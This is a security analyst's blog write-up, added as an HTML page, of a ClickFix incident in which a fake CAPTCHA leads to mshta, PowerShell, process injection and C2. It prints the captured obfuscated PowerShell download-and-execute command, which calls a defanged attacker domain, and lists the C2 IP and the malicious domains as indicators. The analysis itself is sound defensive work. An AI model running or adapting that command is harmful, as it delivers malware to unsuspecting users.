@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ClickFix: Fake CAPTCHA → MSHTA → PowerShell Injection | gx0s</title>
+  <meta name="description" content="A ClickFix social-engineering attack: a fake CAPTCHA tricks the user into running an MSHTA command that downloads PowerShell and injects into svchost.">
+
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2321ba45' d='M12 1 3 5v6c0 5 3.8 9.7 9 11 5.2-1.3 9-6 9-11V5z'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.css">
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.js"></script>
+
+  <style>
+    body { background: #f4f6f8; }
+    .article.container { margin: 6em auto 4em; width: 90vw !important; max-width: 1600px !important; }
+    .article.container p { font-size: 1.1em; line-height: 1.7; text-align: justify; }
+    pre { background:#1b1c1d; color:#9cffb3; padding:1em; border-radius:6px; overflow-x:auto; font-size:0.85em; white-space:pre-wrap; word-break:break-all; }
+    figure { margin: 1.5em 0; }
+    figure img { width:100%; border:1px solid #d4d4d5; border-radius:6px; }
+    figure.narrow { max-width:620px; margin-left:auto; margin-right:auto; }
+    figcaption { color:#888; font-size:0.9em; margin-top:0.5em; text-align:center; }
+    code { background:#eee; padding:0.1em 0.4em; border-radius:3px; }
+    .footer.segment { padding: 0.5em 0; background: #fff; color: rgba(0,0,0,0.87); font-size: 0.9em; }
+    .footer.segment a { color: #4183c4; }
+    .ui.inverted.menu a.item:not(.header):hover { background: #21ba45; color: #fff; }
+    /* Kill-chain timeline */
+    .killchain { display:flex; flex-wrap:wrap; justify-content:center; margin:1.5em 0 0.5em; }
+    .kc-stage { flex:1 1 150px; max-width:230px; text-align:center; padding:0.6em 0.4em; position:relative; }
+    .kc-stage .kc-icon { display:inline-flex; align-items:center; justify-content:center; width:60px; height:60px; border-radius:50%; background:#00b5ad; color:#fff; font-size:1.5em; margin-bottom:.5em; }
+    .kc-stage .kc-icon i { margin:0; }
+    .kc-title { font-weight:700; color:#1b1c1d; }
+    .kc-sub { font-size:.82em; color:#777; word-break:break-word; }
+    .kc-stage:not(:last-child)::after { content:"\2192"; position:absolute; top:24px; right:-7px; color:#bbb; font-size:1.5em; }
+    @media (max-width:640px){ .kc-stage:not(:last-child)::after{ display:none; } }
+    .kc-caption { text-align:center; color:#888; font-size:0.9em; margin-bottom:1.5em; }
+    /* Left contents menu */
+    .toc { display:none; }
+    .toc .toc-title { font-weight:700; text-transform:uppercase; font-size:0.75em; letter-spacing:.05em; color:#999; padding:0 0 .5em .6em; }
+    .toc a { display:block; padding:.32em .6em; color:#555; border-left:2px solid transparent; text-decoration:none; font-size:.88em; line-height:1.3; }
+    .toc a:hover { color:#21ba45; background:#eef1f3; }
+    .toc a.active { color:#21ba45; border-left-color:#21ba45; font-weight:600; }
+    .article.container h2.ui.header { scroll-margin-top: 72px; }
+    @media (min-width:1200px){
+      .toc { display:block; position:fixed; top:4.8em; left:14px; width:225px; max-height:82vh; overflow-y:auto; padding:.4em .2em; }
+      .article.container { margin: 6em 0 4em 265px !important; width:auto !important; max-width:1150px !important; }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- ===== Navigation ===== -->
+  <div class="ui fixed inverted menu">
+    <div class="ui container">
+      <a href="index.html" class="header item">
+        <i class="shield alternate icon"></i>
+        gx0s
+      </a>
+      <a href="index.html" class="item">Home</a>
+      <a href="index.html#profile" class="item">About</a>
+    </div>
+  </div>
+
+  <!-- ===== Article ===== -->
+  <nav class="toc" id="toc"><div class="toc-title">On this page</div></nav>
+
+  <div class="ui article container">
+
+    <a href="index.html" class="ui basic button">
+      <i class="left arrow icon"></i> Back to all cases
+    </a>
+
+    <div class="ui hidden divider"></div>
+
+    <div class="ui label teal"><i class="mouse pointer icon"></i> ClickFix</div>
+    <span style="color:#888; margin-left:1em;"><i class="calendar icon"></i> 2025-03-06 &middot; 6 min read</span>
+
+    <h1 class="ui header" style="margin-top:0.5em;">ClickFix: A Fake CAPTCHA That Runs Malware For You</h1>
+
+    <p><em>Summary: An EDR alert fired on a suspicious PowerShell process spawned through
+    <code>MSHTA</code>. Pulling the thread revealed a textbook <strong>ClickFix</strong>
+    attack — a fake "verify you're human" page that talks the user into pasting a malicious
+    command into the Windows Run dialog. From there it downloaded a payload and injected code
+    into <code>svchost</code>, beaconing out to a server in Russia.</em></p>
+
+    <div class="killchain">
+      <div class="kc-stage"><span class="kc-icon"><i class="robot icon"></i></span><div class="kc-title">Lure</div><div class="kc-sub">Fake CAPTCHA page</div></div>
+      <div class="kc-stage"><span class="kc-icon"><i class="keyboard icon"></i></span><div class="kc-title">Execution</div><div class="kc-sub">Win + R → mshta paste</div></div>
+      <div class="kc-stage"><span class="kc-icon"><i class="terminal icon"></i></span><div class="kc-title">Download</div><div class="kc-sub">Hidden PowerShell payload</div></div>
+      <div class="kc-stage"><span class="kc-icon"><i class="globe icon"></i></span><div class="kc-title">C2</div><div class="kc-sub">89.110.95.20 (Russia)</div></div>
+    </div>
+    <div class="kc-caption">Attack timeline — from fake CAPTCHA to command-and-control.</div>
+
+    <h2 class="ui header"><i class="bullseye icon"></i> What caught my eye</h2>
+    <p>PowerShell launched by <code>mshta.exe</code> is the kind of parent/child pair that makes
+    a SOC analyst sit up straight — legitimate software almost never does this. That single
+    detection unravelled into one of the more clever social-engineering tricks going around
+    right now: <strong>ClickFix</strong>. Instead of exploiting the machine, it exploits the
+    person, convincing them to run the malware themselves under the guise of a CAPTCHA.</p>
+
+    <h2 class="ui header"><i class="hand pointer icon"></i> The lure</h2>
+    <p>The user landed on a page that looked like a routine "prove you're not a robot" check.
+    But rather than clicking images, it asked them to perform a few "verification steps" by
+    hand — a dead giveaway once you know what you're looking at.</p>
+
+    <figure class="narrow">
+      <img src="images/mi25/image2.png" alt="Fake CAPTCHA verification steps popup">
+      <figcaption>The ClickFix lure — a fake "Verification Steps" popup instructing the user to press <strong>Win + R</strong>, paste with <strong>Ctrl + V</strong>, and hit Enter.</figcaption>
+    </figure>
+
+    <h2 class="ui header"><i class="terminal icon"></i> The paste</h2>
+    <p>The page silently copied a command to the clipboard. Following the "steps" pastes it
+    straight into the Run dialog — an <code>mshta</code> call to attacker infrastructure.</p>
+
+    <figure class="narrow">
+      <img src="images/mi25/image3.png" alt="Windows Run dialog with mshta command">
+      <figcaption>The Run dialog with the pasted <code>mshta https://pegas.sizablethursdaychive[.]shop/...</code> command.</figcaption>
+    </figure>
+
+    <h2 class="ui header"><i class="sitemap icon"></i> The execution chain</h2>
+    <p>Once executed, <code>mshta.exe</code> spawned <code>powershell.exe</code> with a hidden
+    window — exactly the alert that started this investigation.</p>
+
+    <table class="ui celled striped table">
+      <thead><tr><th>Time</th><th>EDR event</th></tr></thead>
+      <tbody>
+        <tr><td>2025-03-06 10:57:22</td><td><code>mshta.exe</code> created a process <code>powershell.exe</code> with a hidden window</td></tr>
+      </tbody>
+    </table>
+
+    <p>That PowerShell stage downloaded and executed a follow-on payload directly in memory:</p>
+    <pre>"powershell.exe" -c ([System.Net.WebClient]::New().DownloadString('https://pegas.durablyscrimmage[.]rent/awjxs.recaptcha'))|.( (GV She*d -ValueO)[1]+(ChildItem Variable:S*ell*d).Value[13]+'x')</pre>
+    <p>It dropped a script-policy test artifact in the user's temp folder
+    (<code>C:\Users\&lt;user&gt;\AppData\Local\Temp\__PSScriptPolicyTest_hbqizdzd.jph.ps1</code>)
+    and performed a DNS lookup for <code>usermahnualplatforms11[.]site</code>.</p>
+
+    <h2 class="ui header"><i class="bug icon"></i> Injection &amp; command-and-control</h2>
+    <p>The payload injected code into <code>chrome.exe</code> and <code>svchost.exe</code>, which
+    then established an outbound connection to <code>89.110.95.20</code> over an uncommon port
+    (1301) and ran a WMI query for processor info. The C2 IP geolocates to a hosting provider in
+    the Russian Federation.</p>
+
+    <table class="ui celled striped table">
+      <thead><tr><th>Time</th><th>EDR event</th><th>Technique</th></tr></thead>
+      <tbody>
+        <tr><td>2025-03-06 10:58:48</td><td><code>svchost.exe</code> established an outbound communication with <code>89.110.95.20</code> on uncommon port (1301)</td><td>T1095</td></tr>
+      </tbody>
+    </table>
+    <p style="color:#888;font-size:0.95em;">C2 IP <code>89.110.95.20</code> — hosting provider in the Russian Federation (ASN 48282, Moscow).</p>
+
+    <h2 class="ui header"><i class="crosshairs icon"></i> MITRE ATT&amp;CK Techniques Used</h2>
+    <table class="ui teal celled striped table">
+      <thead><tr><th>Tactic</th><th>Technique</th></tr></thead>
+      <tbody>
+        <tr><td>Initial Access / Execution</td><td>T1204.004 — User Execution: Malicious Copy and Paste (ClickFix)</td></tr>
+        <tr><td>Execution</td><td>T1218.005 — System Binary Proxy Execution: Mshta</td></tr>
+        <tr><td>Execution</td><td>T1059.001 — Command and Scripting Interpreter: PowerShell</td></tr>
+        <tr><td>Defense Evasion</td><td>T1027 — Obfuscated Files or Information</td></tr>
+        <tr><td>Defense Evasion / Privilege Escalation</td><td>T1055.001 — Process Injection: DLL Injection (chrome.exe / svchost)</td></tr>
+        <tr><td>Command and Control</td><td>T1105 — Ingress Tool Transfer</td></tr>
+        <tr><td>Command and Control</td><td>T1095 — Non-Application Layer Protocol (uncommon port 1301)</td></tr>
+        <tr><td>Discovery</td><td>T1047 — Windows Management Instrumentation</td></tr>
+        <tr><td>Discovery</td><td>T1016 — System Network Configuration Discovery (public IP)</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="ui header"><i class="list icon"></i> Indicators of Compromise (IOCs)</h2>
+    <table class="ui red celled striped table">
+      <thead><tr><th>Type</th><th>Indicator</th></tr></thead>
+      <tbody>
+        <tr><td>Lure / landing page</td><td><code>usermahnualplatforms11[.]site</code></td></tr>
+        <tr><td>MSHTA URL</td><td><code>pegas.sizablethursdaychive[.]shop</code></td></tr>
+        <tr><td>PowerShell payload URL</td><td><code>pegas.durablyscrimmage[.]rent/awjxs.recaptcha</code></td></tr>
+        <tr><td>DNS query</td><td><code>usermahnualplatforms11[.]site</code></td></tr>
+        <tr><td>C2 IP</td><td><code>89.110.95.20</code> — uncommon port 1301 (ASN 48282, Russian Federation)</td></tr>
+        <tr><td>Dropped artifact</td><td><code>__PSScriptPolicyTest_hbqizdzd.jph.ps1</code></td></tr>
+        <tr><td>Techniques</td><td>T1218.005 (MSHTA), T1059.001 (PowerShell), T1055.001 (process injection), T1095 (non-app-layer C2), T1047 (WMI)</td></tr>
+      </tbody>
+    </table>
+
+  </div>
+
+  <!-- ===== Footer ===== -->
+  <div class="ui vertical footer segment">
+    <div class="ui center aligned container">
+      <p>&copy; 2026 gx0s &middot; <a href="index.html">Home</a></p>
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      var toc = document.getElementById('toc');
+      if(!toc) return;
+      var heads = document.querySelectorAll('.article.container h2.ui.header');
+      var links = [];
+      heads.forEach(function(h,i){
+        if(!h.id){ h.id = 'sec-'+i; }
+        var a = document.createElement('a');
+        a.href = '#'+h.id;
+        a.textContent = h.textContent.trim();
+        toc.appendChild(a);
+        links.push(a);
+      });
+      function onScroll(){
+        var pos = window.pageYOffset + 100, cur = null;
+        heads.forEach(function(h){ if(h.offsetTop <= pos) cur = h.id; });
+        links.forEach(function(a){ a.classList.toggle('active', a.getAttribute('href') === '#'+cur); });
+      }
+      window.addEventListener('scroll', onScroll); onScroll();
+    })();
+  </script>
+
+</body>
+
+</html>
